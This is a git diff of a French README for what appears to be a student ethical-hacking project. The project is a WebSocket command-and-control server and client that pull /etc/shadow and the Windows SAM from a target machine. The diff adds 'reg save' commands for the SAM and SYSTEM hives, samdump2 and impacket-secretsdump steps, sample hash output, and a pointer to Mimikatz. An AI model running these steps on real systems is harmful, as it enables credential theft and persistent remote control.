@@ -76,9 +76,12 @@ tp-python-EH/
 ├── Server.py           # Serveur WebSocket multi-processus
 ├── common.py           # Fonctions partagées (HMAC, JSON, timestamp)
 ├── README.md           # Documentation
+├── test_sam.py         # Script de test pour extraction SAM
+├── extract_sam.bat     # Script batch pour extraction SAM (Windows)
 ├── screens/            # Captures d'écran (créé automatiquement)
 ├── server_logs/        # Logs des sessions (créé automatiquement)
-└── sam.hiv et system.hiv # Export SAM Windows
+├── sam_export.hiv      # Export SAM (si extraction réussie)
+└── system_export.hiv   # Export SYSTEM (si extraction réussie)
 ```
 
 ---
@@ -98,7 +101,7 @@ tp-python-EH/
 | 9   | `get_sam`             | Exporte la base SAM Windows                    | Windows |
 | 10  | `add_registry`        | Ajoute une clef dans le registre Windows       | Windows |
 | 11  | `get_passwd_shadow`   | Récupère /etc/passwd et /etc/shadow            | Linux   |
-| 12  | `list_root_home`      | Liste /root et /home récursivement             | Linux   | Root       |
+| 12  | `list_root_home`      | Liste /root et /home récursivement             | Linux   |
 
 ### 🔒 Commandes Shell Autorisées (Liste Blanche)
 
@@ -156,22 +159,26 @@ SECRET_KEY = b"supersecretkey123"   # ⚠️ Changer en production !
 ### Démarrer le Serveur
 
 ```bash
-# Sur la machine serveur
+# Sur la machine serveur (Kali Linux ou autre)
 python Server.py
 ```
 
 **Sortie attendue :**
 ```
-INFO Spawned worker-1 pid=1234
-INFO Spawned worker-2 pid=1235
-INFO [worker-1] Worker 1234 écoute sur 0.0.0.0:8765
-INFO [worker-2] Worker 1235 écoute sur 0.0.0.0:8765
+2025-11-09 14:30:00,123 [INFO] Spawned worker-1 pid=1234
+2025-11-09 14:30:00,124 [INFO] Spawned worker-2 pid=1235
+2025-11-09 14:30:00,156 [INFO] [worker-1] Worker 1234 écoute sur 0.0.0.0:8765
+2025-11-09 14:30:00,157 [INFO] [worker-2] Worker 1235 écoute sur 0.0.0.0:8765
 ```
 
 ### Démarrer le Client
 
 ```bash
-# Sur la machine cible (Windows)
+# Sur la machine cible (Windows - utilisateur normal)
+python Client.py
+
+# Sur la machine cible (Windows - avec privilèges admin pour SAM/Registry)
+# Ouvrir PowerShell en tant qu'Administrateur puis :
 python Client.py
 
 # Sur la machine cible (Linux - certaines commandes nécessitent root)
@@ -179,11 +186,50 @@ sudo python Client.py
 ```
 
 **Le client va :**
-1. Se connecter au serveur
-2. S'authentifier via HMAC
-3. Recevoir et exécuter les commandes
-4. Renvoyer les résultats
-5. Se reconnecter automatiquement en cas de déconnexion
+1. ✅ Se connecter au serveur
+2. ✅ S'authentifier via HMAC
+3. ✅ Recevoir et exécuter les commandes
+4. ✅ Renvoyer les résultats
+5. ✅ Se reconnecter automatiquement en cas de déconnexion
+
+---
+
+### 🪟 Extraction de la Base SAM (Windows)
+
+Pour extraire la base SAM Windows, **deux méthodes** :
+
+#### Méthode 1 : Via le Script Batch (Recommandé)
+
+1. **Clic droit** sur `extract_sam.bat` → **"Exécuter en tant qu'administrateur"**
+2. Les fichiers `sam.hiv` et `system.hiv` seront créés
+
+#### Méthode 2 : Manuellement via PowerShell Admin
+
+```powershell
+# Ouvrir PowerShell en tant qu'Administrateur
+cd "C:\Users\...\tp-python-EH"
+reg save HKLM\SAM sam.hiv
+reg save HKLM\SYSTEM system.hiv
+```
+
+#### Extraction des Hash de Mots de Passe
+
+Une fois SAM et SYSTEM exportés, utilisez ces outils (sur Kali Linux) :
+
+```bash
+# Méthode 1 : samdump2
+samdump2 system.hiv sam.hiv
+
+# Méthode 2 : impacket-secretsdump
+impacket-secretsdump -sam sam.hiv -system system.hiv LOCAL
+```
+
+**Sortie attendue :**
+```
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+...
+```
 
 ---
 
@@ -342,12 +388,24 @@ Ce projet permet d'apprendre :
 1. Vérifier que `SECRET_KEY` est identique dans `common.py` (client et serveur)
 2. Vérifier les logs : `Auth failed`
 
-### Problème : Commandes Windows échouent
+### Problème : Commandes Windows échouent (get_sam, add_registry)
 
-**Solution :**
-1. Exécuter `Client.py` en tant qu'administrateur (pour `get_sam`, etc.)
-2. Vérifier UAC (User Account Control)
-3. Consulter les logs de session
+**Causes possibles :**
+1. ❌ Pas de droits administrateur
+2. ❌ UAC (User Account Control) bloque l'accès
+3. ❌ Timeout (commande prend trop de temps)
+
+**Solutions :**
+1. ✅ **Exécuter en tant qu'Administrateur** : Clic droit sur PowerShell → "Run as Administrator"
+2. ✅ Vérifier que le fichier exporté n'est pas vide (0 bytes)
+3. ✅ Utiliser le script `extract_sam.bat` en mode admin
+4. ✅ Sur Windows 11/Credential Guard : utiliser des outils comme Mimikatz ou Volume Shadow Copy
+
+**Vérification :**
+```powershell
+whoami /priv   # Vérifier les privilèges
+dir *.hiv      # Vérifier la taille des fichiers exportés
+```
 
 ### Problème : Timeout sur certaines commandes
 
